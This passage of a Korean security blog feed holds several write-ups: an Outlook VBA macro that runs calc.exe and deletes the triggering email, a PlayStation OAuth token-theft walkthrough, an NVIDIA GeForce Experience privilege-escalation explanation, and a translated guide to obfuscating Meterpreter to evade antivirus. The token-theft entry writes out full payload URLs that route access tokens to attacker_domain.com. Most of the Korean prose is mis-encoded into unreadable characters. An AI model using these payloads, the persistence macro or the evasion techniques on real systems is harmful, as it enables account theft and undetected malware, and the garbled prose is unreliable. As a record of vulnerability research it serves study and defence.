ExplicitPrivate WithEvents olInboxItems As ItemsPrivate Sub Application_Startup()    Set olInboxItems &#x3D; Session.GetDefaultFolder(olFolderInbox).ItemsEnd SubPrivate Sub olInboxItems_ItemAdd(ByVal Item As Object)    On Error Resume Next    Dim olMailItem As MailItem    If TypeOf Item Is MailItem Then       If InStr(olMailItem.Subject, &quot;MDSec&quot;) &gt; 0 Then            MsgBox &quot;Hack The Planet&quot;            Shell &quot;calc.exe&quot;            olMailItem.Delete        End If    End If    Set Item &#x3D; Nothing    Set olMailItem &#x3D; NothingEnd Sub</code></pre><p>ìœ„ POC ì½”ë“œëŠ” calc.exeë¥¼ ì‹¤í–‰í•˜ëŠ” VBA ë§¤í¬ë¡œì…ë‹ˆë‹¤. ìš°ì„  Outlookì´ ì‹¤í–‰ëì„ ë•Œì˜ ìˆ˜ì‹  ë©”ì¼í•¨ ìƒíƒœë¥¼ ì €ì¥í•©ë‹ˆë‹¤. ì´í›„ì— ìƒˆë¡œìš´ ì´ë©”ì¼ì´ ì¶”ê°€ë˜ë©´ ê·¸ ì´ë©”ì¼ì˜ ì œëª©ì„ í™•ì¸í•˜ê³ , ë§Œì•½ ê·¸ ì œëª©ì´ â€œMDSecâ€ì´ë¼ë©´ calc.exeë¥¼ ì‹¤í–‰í•œ í›„ í•´ë‹¹ ì´ë©”ì¼ì„ ì‚­ì œí•©ë‹ˆë‹¤.</p><p>ì´ë©”ì¼ì˜ ì œëª©ë¿ë§Œ ì•„ë‹ˆë¼ ë°œì‹  ì£¼ì†Œ í˜¹ì€ ë‚´ìš© ë“±ìœ¼ë¡œ ë§¤í¬ë¡œì˜ íŠ¸ë¦¬ê±° ì¡°ê±´ì„ ë‹¤ì–‘í•˜ê²Œ ì„¤ì •í•  ìˆ˜ ìˆê³ , calc.exe ëŒ€ì‹  ë¦¬ë²„ìŠ¤ ì‰˜ì„ ì‹¤í–‰í•˜ë©´ í•´ì»¤ê°€ ì›ê²© ì œì–´ë¥¼ í•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤. </p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>windows</tag>
      
      <tag>outlook</tag>
      
      <tag>email</tag>
      
      <tag>persistence access</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Access token stealing in playstation</title>
    <link href="/2020/11/24/l0ch/2020-11-24/"/>
    <url>/2020/11/24/l0ch/2020-11-24/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/821896">Access token stealing in playstation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p><a href="https://my.playstation.com/">https://my.playstation.com</a></p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ì½˜ì†” ê²Œì„ê¸°ê¸°ì¸ PlayStationì˜ ì»¤ë®¤ë‹ˆí‹° <a href="https://my.playstation.com/auth/response.html%EC%97%90%EC%84%9C">https://my.playstation.com/auth/response.htmlì—ì„œ</a> ë¡œê·¸ì¸ëœ ì‚¬ìš©ìì˜ Access Tokenì„ íƒˆì·¨í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p><a href="https://my.playstation.com/auth/response.html?requestID=iframe_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://my.playstation.com">https://my.playstation.com/auth/response.html?requestID=iframe_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://my.playstation.com</a> í˜ì´ì§€ëŠ” ë°œê¸‰ ì„œë²„ì—ì„œ í´ë¼ì´ì–¸íŠ¸ë¡œ OAuth ì•¡ì„¸ìŠ¤ í† í°ì„ ì „ì†¡í•˜ëŠ” ìë°”ìŠ¤í¬ë¦½íŠ¸ë¥¼ í˜¸ìŠ¤íŒ… í•©ë‹ˆë‹¤.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseResponse</span>(<span class="hljs-params">a</span>) </span>&#123;    <span class="hljs-keyword">var</span> b = a.hash.substr(<span class="hljs-number">1</span>),        c = a.search.substr(<span class="hljs-number">1</span>),        d = b + <span class="hljs-string">&quot;&amp;&quot;</span> + c,        e = convertToObject(d);    <span class="hljs-keyword">return</span> e.refererURL = a.toString(), e&#125;....<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sendResponseToApp</span>(<span class="hljs-params">a</span>) </span>&#123;    <span class="hljs-keyword">var</span> b = extractFrameTypeFromRequestID(a.requestID),        c = a.targetOrigin || getOrigin(),        d = a.baseUrl || <span class="hljs-string">&quot;&quot;</span>,        e = a.returnRoute || <span class="hljs-string">&quot;&quot;</span>,        f = a.excludeQueryParams,        g = !f &amp;&amp; <span class="hljs-built_in">window</span>.location.search || <span class="hljs-string">&quot;&quot;</span>;    <span class="hljs-keyword">switch</span> (b) &#123;...        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;window&quot;</span>:            <span class="hljs-built_in">window</span>.opener.postMessage(a, c);            <span class="hljs-keyword">break</span>;...    &#125;&#125;<span class="hljs-keyword">var</span> response = parseResponse(<span class="hljs-built_in">window</span>.location);sendResponseToApp(response);</code></pre><p>í˜¸ìŠ¤íŒ…ëœ ìœ„ ìë°”ìŠ¤í¬ë¦½íŠ¸ì—ì„œ ì•„ë˜ ê³¼ì •ì„ í†µí•´ access tokenì„ í•´ì»¤ì˜ ì„œë²„ë¡œ ì „ì†¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ol><li>request queryë¥¼ <code>parseResponse()</code> í•¨ìˆ˜ì—ì„œ íŒŒì‹± í•œ ë’¤  <code>sendResponseToApp()</code> ì˜ ë§¤ê°œë³€ìˆ˜ë¡œ ì „ë‹¬í•´ í˜¸ì¶œí•©ë‹ˆë‹¤.</li><li>query ì¤‘ <code>reqeustID</code> í•„ë“œ ê°’ì´ â€œwindowâ€ ë©´ <code>window.opener.postMessage()</code>ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤.</li><li><code>window.opener.postMessage()</code> ëŠ” ì²« ë²ˆì§¸ ë§¤ê°œë³€ìˆ˜ë¥¼ ë‘ ë²ˆì§¸ ë§¤ê°œë³€ìˆ˜ì¸ íŠ¹ì • ë„ë©”ì¸ìœ¼ë¡œ ì „ë‹¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë§¤ê°œë³€ìˆ˜ë¡œ queryì™€ <code>targetOrigin</code> í•„ë“œ ê°’ì´ ì „ë‹¬ë˜ë©´ <code>targetOrigin</code> ë„ë©”ì¸ìœ¼ë¡œ queryì— í¬í•¨ë˜ì–´ ìˆëŠ” Access Tokenì„ ì „ì†¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li></ol><p>ì´ë¥¼ ì´ìš©í•œ ìµœì¢… í˜ì´ë¡œë“œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs jsx">https:<span class="hljs-comment">//my.playstation.com/auth/response.html?requestID=window_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://attacker_domain.com </span></code></pre><p>ìœ„ í˜ì´ë¡œë“œë¥¼ OAuth ë°œê¸‰ ì„œë²„ request queryì˜ <code>redirect_uri</code> í•„ë“œ ê°’ìœ¼ë¡œ ë³´ë‚´ë©´ Access Tokenì„ íƒˆì·¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs jsx">https:<span class="hljs-comment">//auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&amp;scope=capone:report_submission,kamaji:game_list,kamaji:get_account_hash,user:account.get,user:account.profile.get,kamaji:social_get_graph,kamaji:ugc:distributor,user:account.identityMapper,kamaji:music_views,kamaji:activity_feed_get_feed_privacy,kamaji:activity_feed_get_news_feed,kamaji:activity_feed_submit_feed_story,kamaji:activity_feed_internal_feed_submit_story,kamaji:account_link_token_web,kamaji:ugc:distributor_web,kamaji:url_preview&amp;client_id=656ace0b-d627-47e6-915c-13b259cd06b2&amp;redirect_uri=https://my.playstation.com/auth/response.html?requestID=window_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://attacker_domain.com/&amp;prompt=non</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>L0ch</tag>
      
      <tag>access token stealing</tag>
      
      <tag>playstation</tag>
      
      <tag>javascript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-5990: NVIDIA GeForce Experience Local Privilege Escalation</title>
    <link href="/2020/11/23/idioth/2020-11-23/"/>
    <url>/2020/11/23/idioth/2020-11-23/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.trendmicro.com/en_us/research/20/k/cve-2020-17053-use-after-free-ie-vulnerability.html">CVE-2020-17053: Use-After-Free IE Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>NVIDIA GeForce Experience 3.20.5.70 ì´ì „ ë²„ì „</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>NVDIA GeForce Experienceì˜ GeForce ê·¸ë˜í”½ì¹´ë“œê°€ ì„¤ì¹˜ëœ ì¥ë¹„ë¡œ ì›ê²© ê²Œì„ì„ ì§€ì›í•˜ëŠ” GAMESTREAM ê¸°ëŠ¥ì—ì„œ Local Privilege Escalation ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>nvcontainer.exe í”„ë¡œì„¸ìŠ¤ëŠ” user impersonation ì—†ì´ <code>C:\\ProgramData\\NVIDIA Corporation\\ShadowPlay\\</code> ë””ë ‰í„°ë¦¬ì— <code>CaptureCore.log</code> íŒŒì¼ì„ ì“°ê±°ë‚˜ ìƒì„±í•©ë‹ˆë‹¤. ì´ë•Œ ìƒìœ„ í´ë” ìƒì†ìœ¼ë¡œ ì¸í•´ ëª¨ë“  ì‚¬ìš©ìëŠ” í•´ë‹¹ íŒŒì¼ê³¼ íŒŒì¼ì´ ìˆëŠ” í´ë”ì— ëª¨ë“  ê¶Œí•œì„ ê°–ìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ <code>CaptureCore.log</code> íŒŒì¼ì„ ì‚­ì œí•œ í›„ GAMESTREAMì„ ì¬ì‹œì‘í•˜ë©´ <code>nvspapi64.dll</code>ì—ì„œ ì†Œí”„íŠ¸ ë§í¬ì™€ í•˜ë“œ ë§í¬ì— ëŒ€í•œ ê²€ì‚¬ë¥¼ ì§„í–‰í•˜ì—¬ ì‹¬ë³¼ë¦­ ë§í¬ íŒŒì¼ì„ ì‚­ì œí•©ë‹ˆë‹¤. ì´ ì‘ì—…ì€ <code>nvspapi64.dll</code>ì—ì„œ ìˆ˜í–‰ë˜ëŠ”ë° ê²€ì‚¬ë¥¼ ì§„í–‰í•œ í›„ <code>CaptureCore.log</code>ì— ëŒ€í•œ í•¸ë“¤ì„ ë‹«ê³  ìµœì¢… ê²½ë¡œë¥¼ ê°€ì ¸ì™€ ì‘ì—…ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ ë‹¤ì‹œ í•¸ë“¤ì„ ì—½ë‹ˆë‹¤.</p><p><img src="/2020/11/23/idioth/2020-11-23/image.png"></p><p>ì´ë¥¼ í™œìš©í•˜ì—¬ íŠ¹ì • íŒŒì¼ì— ëŒ€í•œ access eventë¥¼ catch í•˜ëŠ” <a href="https://docs.microsoft.com/en-us/windows/win32/fileio/opportunistic-locks">OpLock</a>ì„ CaptureCore.logì— ì„¤ì •í•œ í›„ ê²€ì‚¬ë¥¼ ì§„í–‰í•˜ë©´ OpLockì´ íŠ¸ë¦¬ê±° ë˜ì–´ C:\Windows\System32 í´ë”ì— arbitrary file creationì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>race condition</tag>
      
      <tag>toctou</tag>
      
      <tag>lpe</tag>
      
      <tag>idioth</tag>
      
      <tag>geforce experience</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] Engineering Antivirus evasion Part.1</title>
    <link href="/2020/11/22/idioth/av_evasion_part1/"/>
    <url>/2020/11/22/idioth/av_evasion_part1/</url>
    
    <content type="html"><![CDATA[<p>ì•ˆë…•í•˜ì„¸ìš”. í•˜ì§€ ë§ë¼ëŠ” ê²ƒì€ ë” í•˜ê³  ì‹¶ì€ idiothì…ë‹ˆë‹¤.</p><p>ì›ë˜ ì‚¬ëŒì€ í•˜ì§€ ë§ë¼ë©´ ë” í•˜ê³  ì‹¶ì€ ë²•. ê·¸ë˜ì„œ í‰ì†Œ íƒì§€ ìš°íšŒí•˜ëŠ” ê²ƒì— ëŒ€í•´ ê´€ì‹¬ì´ ë§ì€ë° ê´€ë ¨ ê¸€ì´ ìˆê¸¸ë˜ ë“¤ê³  ì™”ìŠµë‹ˆë‹¤.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/image.jpg"></p><p>í‰ì†Œì—ëŠ” ê·¸ëƒ¥ í˜¼ì ê³µë¶€í•˜ê³  í˜¼ì ë³´ëŠ”ê±°ë¼ ì§ë…ì§í•´ í•´ë†“ê³  ìŠ¤ìŠ¤ë¡œ ë¨¸ë¦¿ ì†ì—ì„œ ì •ë¦¬í•˜ì˜€ëŠ”ë° ê¸€ë¡œ ì ìœ¼ë ¤ë‹ˆ ê³ ìƒì„ ì¢€ í–ˆìŠµë‹ˆë‹¤. ì˜ì–´ ì‹¤ë ¥ì´ ì¢‹ì€ ê²ƒë„ ì•„ë‹ˆê³  ë²ˆì—­ì„ ë§ì´ í•´ë³¸ ê²ƒë„ ì•„ë‹ˆë¼ ì˜ì—­ê³¼ ì˜¤ì—­ì´ ë‚œë¬´í•˜ëŠ” ê¸€ì´ ë  ê²ƒ ê°™ìŠµë‹ˆë‹¤â€¦</p><p>ë³´ì‹œë‹¤ê°€ ì´ ë¶€ë¶„ì€ ì™œ ì´ë ‡ê²Œ ë²ˆì—­ì´ ëì§€? í˜¹ì€ ë„ˆë¬´ ì´ìƒí•œë°? í•˜ì‹œëŠ” ê²ƒ ìˆìœ¼ì‹œë©´ ëŒ“ê¸€ë¡œ ë‹¬ì•„ë“œë¦¬ë©´ ëˆˆë¬¼ í˜ë¦¬ë©° ìˆ˜ì •í•˜ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤!</p><blockquote><p>ì›ë¬¸ ê¸€ : <a href="https://blog.scrt.ch/2020/06/19/engineering-antivirus-evasion/">Engineering Antivirus evasion</a></p></blockquote><p><strong>tl;dr:</strong> ì´ ê²Œì‹œë¬¼ì€ ëª¨ë“  AV/EDRì„ ìš°íšŒí•˜ê¸° ìœ„í•´ ìë™ìœ¼ë¡œ Meterpreterì„ refactoring í•˜ëŠ” ê²ƒì— ëŒ€í•´ ì„¤ëª…í•œë‹¤. ëª¨ë“  ê¸°ìˆ ì— ëŒ€í•œ ì•„ì´ë””ì–´ì™€ ë¬¸ìì—´ ë‚œë…í™” íŒ¨ìŠ¤ì˜ êµ¬í˜„ì´ ìƒì„¸íˆ ì„¤ëª…ë˜ì–´ìˆë‹¤. API importë¥¼ ìˆ¨ê¸°ëŠ” ê²ƒê³¼ syscall ì¬ì‘ì„±ì— ëŒ€í•œ ìì„¸í•œ ë‚´ìš©ì€ ê²Œì‹œê¸€ì´ ë„ˆë¬´ ê¸¸ì–´ì§€ë¯€ë¡œ ë‹¤ìŒ ê¸€ì—ì„œ ì†Œê°œí•  ê²ƒì´ë‹¤. ì†ŒìŠ¤ì½”ë“œëŠ” <a href="https://github.com/scrt/avcleaner">github</a>ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</p><p>ê¸°ì—…ì´ ì •ë³´ ì‹œìŠ¤í…œì„ ë³´í˜¸í•˜ê¸° ìœ„í•´ì„œ ì•ˆí‹° ë°”ì´ëŸ¬ìŠ¤ì™€ EDR ê°™ì€ ë³´ì•ˆ ì†Œí”„íŠ¸ì›¨ì–´ëŠ” í•„ìˆ˜ì ì´ë‹¤. ê³¼ê±°ì—ëŠ” ëª¨ë“  ë©€ì›¨ì–´ íƒì§€ ê¸°ìˆ ì„ ìš°íšŒí•˜ê¸°ê°€ ì‰¬ì› ì§€ë§Œ íƒì§€ ê¸°ìˆ ì´ ë°œì „í•¨ì— ë”°ë¼ ìš°íšŒì— ë” ë§ì€ ë…¸ë ¥ì´ í•„ìš”í•˜ë‹¤.</p><p>ì·¨ì•½ì ì„ ì¦ëª…í•˜ê¸° ìœ„í•œ Proof-of-Conceptê°€ ì•ˆí‹° ë°”ì´ëŸ¬ìŠ¤ì— ì˜í•´ ì°¨ë‹¨ëœ ê²½ìš° ìœ„í—˜ì„±ì— ëŒ€í•´ ì´ì•¼ê¸°í•˜ëŠ” ê²ƒì€ ë§¤ìš° ì–´ë µë‹¤. ì´ë¡ ì ìœ¼ë¡œ íƒì§€ë¥¼ ìš°íšŒí•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•˜ë‹¤ê³  ì–˜ê¸°í•  ìˆ˜ ìˆì§€ë§Œ ì¦ëª…í•˜ê¸°ê°€ ì–´ë µë‹¤.</p><p> ë˜í•œ ì‹œìŠ¤í…œì˜ existing footholdì—ì„œë§Œ ë°œê²¬í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ë“¤ì´ ìˆë‹¤. pentesterê°€ initial levelì— ì ‘ê·¼í•  ìˆ˜ ì—†ëŠ” ê²½ìš° ì‹œìŠ¤í…œì˜ ì‹¤ì œ ë³´ì•ˆ ìƒíƒœë¥¼ ë„ì¶œí•  ìˆ˜ ì—†ë‹¤.</p><p>ë”°ë¼ì„œ ì•ˆí‹°ë°”ì´ëŸ¬ìŠ¤ ì†Œí”„íŠ¸ì›¨ì–´ ìš°íšŒëŠ” í•„ìš”í•˜ë‹¤. SCRT(í•„ìì˜ íŒ€)ì—ì„œëŠ” ê³µê°œì ìœ¼ë¡œ ì‚¬ìš© ê°€ëŠ¥í•œ ì˜¤í”ˆ ì†ŒìŠ¤ íˆ´ì„ ì‚¬ìš©í•´ íˆ´ì„ ì‚¬ìš©í•˜ëŠ”ë° ìˆ™ë ¨ëœ ëˆ„êµ¬ë‚˜ ë”°ë¼ í•  ìˆ˜ ìˆìœ¼ë©° private í•˜ê³  ë¹„ì‹¼ íˆ´ì— ì˜ì¡´í•˜ì§€ ì•Šì•„ë„ ëœë‹¤ëŠ” ì ì„ ê°•ì¡°í•œë‹¤.</p><h1 id="ë¬¸ì œì "><a href="#ë¬¸ì œì " class="headerlink" title="ë¬¸ì œì "></a>ë¬¸ì œì </h1><p>ì‚¬ëŒë“¤ì€ ì•ˆí‹° ë°”ì´ëŸ¬ìŠ¤ì˜ íƒì§€ê°€ ì •ì ì¸ì§€ ë™ì ì¸ì§€ ë¶„ë¥˜í•˜ëŠ” ê²ƒì„ ì¢‹ì•„í•œë‹¤. ë³´í†µ ì‹¤í–‰ ì „ì— íŠ¸ë¦¬ê±° ë˜ë©´ ì •ì  íƒì§€ë¡œ ê°„ì£¼ëœë‹¤. í•˜ì§€ë§Œ í”„ë¡œì„¸ìŠ¤ ìƒì„±, in-memory file downloads ê°™ì€ ì´ë²¤íŠ¸ë¥¼ í†µí•´ ë©€ì›¨ì–´ ì‹¤í–‰ ì‹œ signatureì™€ ê°™ì€ ì •ì  íƒì§€ ë©”ì»¤ë‹ˆì¦˜ì´ í˜¸ì¶œë  ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì€ ì•„ëŠ” ê²ƒì´ ì¢‹ë‹¤. ëª¨ë“  ë³´ì•ˆ ì†Œí”„íŠ¸ì›¨ì–´ì— Meterpreterë¥¼ ì‚¬ìš©í•˜ë ¤ë©´ ë‹¤ìŒê³¼ ê°™ì´ ìˆ˜ì •í•´ì•¼ í•œë‹¤.</p><ul><li>íŒŒì¼ ì‹œìŠ¤í…œ ìŠ¤ìº” í˜¹ì€ ë©”ëª¨ë¦¬ ìŠ¤ìº” ì¤‘ì— ëª¨ë“  static signature ìš°íšŒ</li><li>userland API hooking ìš°íšŒì™€ ê´€ë ¨ëœ â€œí–‰ë™ íƒì§€â€ ìš°íšŒ</li></ul><p>MeterpreterëŠ” ì—¬ëŸ¬ ëª¨ë“ˆë¡œ êµ¬ì„±ë˜ë©° ì „ì²´ ì½”ë“œ ë² ì´ìŠ¤ì˜ ì–‘ì´ ë§ê³  ê³„ì† ì—…ë°ì´íŠ¸ë˜ë¯€ë¡œ private forkë¥¼ ìˆ˜í–‰í•˜ê¸° í˜ë“¤ë‹¤. ë”°ë¼ì„œ ìë™ìœ¼ë¡œ ì½”ë“œ ë² ì´ìŠ¤ë¥¼ ìˆ˜ì •í•  ë°©ë²•ì´ í•„ìš”í•˜ë‹¤.</p><h1 id="í•´ê²°-ë°©ì•ˆ"><a href="#í•´ê²°-ë°©ì•ˆ" class="headerlink" title="í•´ê²° ë°©ì•ˆ"></a>í•´ê²° ë°©ì•ˆ</h1><p>ë©€ì›¨ì–´ íƒì§€ëŠ” ëŒ€ë¶€ë¶„ ë¬¸ìì—´, API hook, í˜¹ì€ ë‘˜ì˜ ì¡°í•©ì„ ê¸°ë°˜ìœ¼ë¡œ í•œë‹¤.</p><p>Cylance ê°™ì€ ë¨¸ì‹ ëŸ¬ë‹ classifierë¥¼ êµ¬í˜„í•˜ëŠ” ì œí’ˆì—ì„œë„ ë¬¸ìì—´, API import, í›„í‚¹ í•  ìˆ˜ ìˆëŠ” API í˜¸ì¶œì´ ì—†ëŠ” ë©€ì›¨ì–´ëŠ” íƒì§€ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆë‹¤.</p><p>MeterpreterëŠ” ìˆ˜ì²œ ê°œì˜ ë¬¸ìì—´ì„ ê°€ì§€ê³  ìˆê³  API importsëŠ” ì–´ë– í•œ ë°©ë²•ìœ¼ë¡œë„ ìˆ¨ê²¨ì§€ì§€ ì•Šìœ¼ë©° <code>WriteProcessMemory</code> ê°™ì€ ë¯¼ê°í•œ APIëŠ” userland API hookìœ¼ë¡œ ì‰½ê²Œ intercept í•  ìˆ˜ ìˆë‹¤. ë”°ë¼ì„œ ìë™í™”ëœ ë°©ì‹ì„ ì‚¬ìš©í•˜ì—¬ 2ê°œì˜ ì†”ë£¨ì…˜ì„ ë§Œë“¤ì–´ì•¼ í•œë‹¤.</p><ul><li>Source-to-source code refactoring</li><li>LLVM ì»´íŒŒì¼ ì‹œ ì½”ë“œ ë² ì´ìŠ¤ ë‚œë…í™”</li></ul><p>í›„ìê°€ ì„ í˜¸ë˜ëŠ” ë°©ì‹ì´ë©° ë§ì€ ìœ ëª…í•œ ì—°êµ¬ë“¤ì—ì„œ ê°™ì€ ê²°ë¡ ì— ë„ë‹¬í–ˆë‹¤. transformation passë¥¼ í•œ ë²ˆ ì‘ì„±í•´ì„œ ì†Œí”„íŠ¸ì›¨ì–´ì˜ í”„ë¡œê·¸ë˜ë° ì–¸ì–´ë‚˜ target architectureì— ìƒê´€ì—†ì´ ì¬ì‚¬ìš©í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì´ë‹¤.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/0.png"></p><p>ì´ë¯¸ì§€ ì¶œì²˜: <a href="http://www.aosabook.org/en/llvm.html">http://www.aosabook.org/en/llvm.html</a></p><p>ê·¸ëŸ¬ë‚˜ ì´ ë°©ë²•ì€ Visual Studioê°€ ì•„ë‹Œ ë‹¤ë¥¸ ì»´íŒŒì¼ëŸ¬ë¡œ Meterpreterë¥¼ ì»´íŒŒì¼í•  ìˆ˜ ìˆì–´ì•¼ í•œë‹¤. ì´ë¥¼ ìˆ˜ì •í•˜ê¸° ìœ„í•´ 2018ë…„ 12ì›”ì— ëª‡ ê°€ì§€ ì‘ì—…ì„ í¼ë¸”ë¦¬ì‹œí–ˆì§€ë§Œ 1ë…„ì´ ë” ì§€ë‚œ ì§€ê¸ˆë„ ê³µì‹ ì½”ë“œ ë² ì´ìŠ¤ì— ì ìš©ë˜ì§€ ì•Šì•˜ë‹¤.</p><p>ê·¸ë™ì•ˆ ìš°ë¦¬ëŠ” ì²« ë²ˆì§¸ ì ‘ê·¼ë²•ì„ êµ¬í˜„í•˜ê¸°ë¡œ ê²°ì •í–ˆë‹¤. ìµœì²¨ë‹¨ ì†ŒìŠ¤ ì½”ë“œ refactoringë¥¼ ì‚´í´ë³¸ ê²°ê³¼ <em>libTooling</em>(Clang/LLVM toolchainì˜ ì¼ë¶€)ì´ C/C++ ì†ŒìŠ¤ì˜ êµ¬ë¬¸ ë¶„ì„ê³¼ ìˆ˜ì •ì— ê°€ì¥ ì í•©í–ˆë‹¤.</p><p>Note: ì½”ë“œ ë² ì´ìŠ¤ëŠ” Visual Studio ì˜ì¡´ì„±ì´ ê°•í•˜ê¸° ë•Œë¬¸ì— Clangì€ Meterpreterì˜ ë§ì€ ë¶€ë¶„ì˜ êµ¬ë¬¸ ë¶„ì„ì— ì‹¤íŒ¨í•  ê²ƒì´ë‹¤. ê·¸ëŸ¬ë‚˜ íƒ€ê²Ÿ ì•ˆí‹°ë°”ì´ëŸ¬ìŠ¤ë¥¼ 50% í™•ë¥ ë¡œ ìš°íšŒí•  ìˆ˜ ìˆì—ˆë‹¤. ë˜í•œ ì†ŒìŠ¤ ì½”ë“œë¥¼ ë³€í™˜í•˜ëŠ” ê²ƒì´ ì»´íŒŒì¼ ì‹œì— ë³€í™˜í•˜ëŠ” ê²ƒë³´ë‹¤ ì¥ì ì´ ìˆì„ ê²ƒì´ë‹¤. í›„ìëŠ” ì—ëŸ¬ ì—†ì´ ì „ì²´ í”„ë¡œì íŠ¸ë¥¼ ì»´íŒŒì¼í•´ì•¼ í•˜ì§€ë§Œ ì „ìëŠ” ìˆ˜ì²œ ê°œì˜ ì»´íŒŒì¼ ì—ëŸ¬ì— íƒ„ë ¥ì ì´ë©° ë¶ˆì™„ì „í•œ ì¶”ìƒ êµ¬ë¬¸ íŠ¸ë¦¬ë¡œ ëì´ ë‚œë‹¤.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/1.png"></p><p>LLVM passes vs libTooling</p><h2 id="ë¬¸ìì—´-ë‚œë…í™”"><a href="#ë¬¸ìì—´-ë‚œë…í™”" class="headerlink" title="ë¬¸ìì—´ ë‚œë…í™”"></a>ë¬¸ìì—´ ë‚œë…í™”</h2><p>C/C++ì—ì„œ ë¬¸ìì—´ì€ ë‹¤ì–‘í•œ context ì•ˆì— ì¡´ì¬í•œë‹¤.</p><p><em>libTooling</em>ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì€ ë³µì¡í•˜ë¯€ë¡œ Meterpreterì˜ ì½”ë“œ ë² ì´ìŠ¤ì—ì„œ ì˜ì‹¬ìŠ¤ëŸ¬ìš´ ë¬¸ìì—´ì´ ë‚˜íƒ€ë‚˜ëŠ” ë¶€ë¶„ì„ ë³´ë©´ ë‹¤ìŒê³¼ ê°™ë‹¤.</p><ul><li>function arguments</li><li>list initializers</li></ul><h3 id="Fcuntion-arguments"><a href="#Fcuntion-arguments" class="headerlink" title="Fcuntion arguments"></a>Fcuntion arguments</h3><p>ESET Nod32ëŠ” ë‹¤ìŒ ì½”ë“œì—ì„œ <code>ntdll</code> ë¬¸ìì—´ì„ ì˜ì‹¬ìŠ¤ëŸ¬ìš´ ë¬¸ìì—´ë¡œ íƒì§€í•œë‹¤.</p><pre><code class="hljs cpp">ntdll = LoadLibrary(TEXT(<span class="hljs-string">&quot;ntdll&quot;</span>))</code></pre><p>ê·¸ëŸ¬ë‚˜ ë‹¤ìŒê³¼ ê°™ì´ ì½”ë“œë¥¼ ì¬ì‘ì„±í•˜ë©´ ì„±ê³µì ìœ¼ë¡œ íƒì§€ë¥¼ ìš°íšŒí•œë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-keyword">wchar_t</span> ntdll_str[] = &#123;<span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-number">0</span>&#125;;ntdll = LoadLibrary(ntdll_str)</code></pre><p>ì²« ë²ˆì§¸ ì½”ë“œëŠ” <code>.rdata</code> ì„¹ì…˜ì— <code>&quot;ntdll&quot;</code> ë¬¸ìì—´ì´ ì €ì¥ë¼ì„œ ì•ˆí‹°ë°”ì´ëŸ¬ìŠ¤ì—ê²Œ ì‰½ê²Œ ë°œê²¬ëœë‹¤. ë‘ ë²ˆì§¸ ì½”ë“œëŠ” ë¬¸ìì—´ì´ ì‹¤í–‰ ì‹œ ìŠ¤íƒì— ì €ì¥ë¼ì„œ ë³´í†µ ì •ì ìœ¼ë¡œ êµ¬ë¶„í•  ìˆ˜ ì—†ë‹¤. <em>IDA Pro</em>ì™€ ê°™ì€ íˆ´ì—ì„œëŠ” ë¬¸ìì—´ì„ íƒì§€í•  ìˆ˜ ìˆì§€ë§Œ ë°”ì´ë„ˆë¦¬ë¥¼ ë” 